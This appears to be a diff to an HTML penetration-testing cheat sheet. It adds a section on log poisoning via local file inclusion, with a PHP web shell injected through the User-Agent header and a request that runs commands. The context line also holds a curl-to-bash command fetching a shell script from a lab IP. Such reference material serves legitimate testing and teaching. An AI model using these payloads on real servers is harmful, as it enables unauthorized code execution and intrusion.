@@ -354,6 +354,19 @@ os.system("curl http://10.10.14.17:8000/shell.sh | bash")
                                     <p>Then send the request </p>
                                     <pre><code class="language-url">http://10.10.10.1:8080/index.php?language=/var/log/apache2/access.log?cmd=id</code></pre>
                                 </ul>
+
+                                <h3>Server log Poisoning</h3>
+                                <ul>
+                                    <p>In this case we must check if we are able to view the logs using a file inclusion.</p>
+                                    <p>Apache logs are normally located at <b>/var/log/apache2/access.log, error.log  (Linux)</b> and <b>C:\xampp\apache\logs\ (Windows)</b></p>
+                                    <p>Nginx logs are normally located at <b>/var/log/nginx/ (Linux)</b> and <b>C:\nginx\log\</b></p>
+                                    <p>In case you are able to read any of them you'll figure out that the User-Agent is also stored there, which is a parameter that we can control</p>
+                                    <p>So you'll need to intercept the request and introduce any php code &lt;?php system($_GET['cmd']) ?&gt;</p>
+                                    <p>Then send the request </p>
+                                    <pre><code class="language-url">http://10.10.10.1:8080/index.php?language=/var/log/apache2/access.log?cmd=id</code></pre>
+                                </ul>
+
+                                
                             </ul>
                     </div>
                 </ul>
